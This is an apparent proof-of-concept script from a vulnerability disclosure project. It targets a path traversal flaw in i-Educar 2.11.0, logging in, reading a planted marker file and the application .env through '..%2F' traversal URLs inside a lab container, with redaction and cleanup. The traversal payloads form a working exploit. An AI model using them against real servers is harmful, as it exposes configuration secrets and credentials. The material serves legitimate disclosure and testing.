#!/usr/bin/env python3
"""VULN 05 — path traversal / local file read in LegacyModuleRewriteController.

`GET /module/{module}/styles/{resource}` concatenates the route parameters
into `base_path("ieducar/intranet/styles/{$resource}")` and returns the file
with `file_get_contents()`. `..` segments delivered as `%2F` bypass the nginx
normalization and let any authenticated user read files outside the intended
directory (for example the application `.env`).

The PoC writes an HTML marker file inside the container, reads it back through
the traversal, then reads `.env` and logs it with secrets redacted, and finally
removes the marker. Read-only against application data.
"""

from __future__ import annotations

import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from lib import credentials, evidence, http_util, lab_guard, poc_cli
from lib import lab as lab_mod  # noqa: E402

VULN = {
    "id": "05",
    "slug": "module-rewrite-path-traversal",
    "title": "Path traversal / local file read in LegacyModuleRewriteController",
    "product": "i-Educar",
    "affected_version": "2.11.0 (latest release, tag 2.11.0)",
    "cwe_id": "CWE-22",
    "cwe_name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
    "cwe_source_url": "https://cwe.mitre.org/data/definitions/22.html",
    "cwe_confidence": "high",
    "cwe_justification": (
        "User-controlled route segments are concatenated into a filesystem path without "
        "neutralizing '..', so the product reads files outside the intended directory: "
        "CWE-22. CWE-98 (PHP remote file inclusion) does not apply because no include "
        "happens and no remote file is fetched; CWE-73 is the neutral 'external control of "
        "file name' parent and is less specific."
    ),
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
    "cvss_score": 7.7,
    "endpoint": "GET /module/{module}/styles/{resource}",
    "params": ["resource"],
    "precondition": "login (any profile)",
    "reported_at": "",
    "followups": [],
    "silence_days": 0,
    "status": "verified",
    "blocked_reason": "",
    "screenshots": [
        "evidence/screenshots/05-module-rewrite-path-traversal-01-traversal-marker.png",
        "evidence/screenshots/05-module-rewrite-path-traversal-02-env-redacted-proof.png",
    ],
    "advisory_url": "https://github.com/i-explorar/i-explorar/blob/main/vulns/05-module-rewrite-path-traversal/README.md",
}

MARKER_NAME = "i_explorar_poc05_marker.html"
MARKER_PATH = f"/var/www/ieducar/{MARKER_NAME}"
MARKER_HTML = (
    "<html><head><title>i-explorar VULN 05 marker</title></head><body>"
    "<h1>i-explorar VULN 05 — arbitrary file read</h1>"
    "<p>This file lives at <code>/var/www/ieducar/i_explorar_poc05_marker.html</code> "
    "and was read through <code>GET /module/x/styles/..%2F..%2F..%2Fi_explorar_poc05_marker.html</code>"
    "</p></body></html>"
)
TRAVERSAL_MARKER = f"/module/x/styles/..%2F..%2F..%2F{MARKER_NAME}"
TRAVERSAL_ENV = "/module/x/styles/..%2F..%2F..%2F.env"

SECRETARY = credentials.credentials("secretary")


def _compose(lab: Path, *args: str) -> list[str]:
    return lab_mod.compose(lab, *args)


def run(target: str, *, verbose: bool = False) -> dict:
    lab_guard.check_target(target)

    vuln_dir = Path(__file__).resolve().parent
    lab = lab_mod.lab_dir()
    log = evidence.EvidenceLog(vuln_dir)
    notes: list[str] = []

    log.write(f"# target: {target}")
    client = http_util.HttpClient(target, verbose=verbose)
    client.login(*SECRETARY)
    if not client.logged_in():
        log.close()
        return {"vulnerable": False, "evidence": [str(log.path)], "notes": "login failed"}

    marker_read = env_read = False
    try:
        seed = subprocess.run(
            _compose(lab, "exec", "-T", "php", "sh", "-c", f"cat > {MARKER_PATH}"),
            cwd=lab,
            input=MARKER_HTML,
            capture_output=True,
            text=True,
            timeout=120,
        )
        log.command(f"docker compose exec -T php sh -c 'cat > {MARKER_PATH}'  # marker written")
        log.block("seed output", (seed.stdout + seed.stderr).strip() or "(empty)")

        marker = client.get(TRAVERSAL_MARKER)
        log.write("")
        log.write(f"### GET {TRAVERSAL_MARKER}")
        log.write(f"HTTP {marker.status} content-type={marker.headers.get('content-type', '?')}")
        log.block("body", marker.text.strip()[:1500])
        marker_read = marker.status == 200 and "arbitrary file read" in marker.text

        dotenv = client.get(TRAVERSAL_ENV)
        log.write("")
        log.write(f"### GET {TRAVERSAL_ENV}")
        log.write(f"HTTP {dotenv.status} content-type={dotenv.headers.get('content-type', '?')}")
        log.block("body (secrets redacted by the evidence writer)", dotenv.text.strip()[:2000])
        env_read = dotenv.status == 200 and "APP_NAME=i-Educar" in dotenv.text

        # control: a path that does not exist must fail, not silently succeed
        missing = client.get("/module/x/styles/..%2F..%2F..%2Fno_such_file_i_explorar")
        log.write("")
        log.write("### control: GET /module/x/styles/..%2F..%2F..%2Fno_such_file_i_explorar")
        log.write(f"HTTP {missing.status}")
    finally:
        cleanup = subprocess.run(
            _compose(lab, "exec", "-T", "php", "rm", "-f", MARKER_PATH),
            cwd=lab,
            capture_output=True,
            text=True,
            timeout=120,
        )
        log.command(f"docker compose exec -T php rm -f {MARKER_PATH}")
        log.block("cleanup output", (cleanup.stdout + cleanup.stderr).strip() or "(empty)")
        log.close()

    vulnerable = marker_read and env_read
    notes.append(f"marker read={marker_read}; .env read={env_read} (APP_NAME=i-Educar)")
    return {"vulnerable": vulnerable, "evidence": [str(log.path)], "notes": "; ".join(notes)}


def main(argv: list[str] | None = None) -> int:
    return poc_cli.poc_main(VULN, run, argv, __file__)


if __name__ == "__main__":
    sys.exit(main())
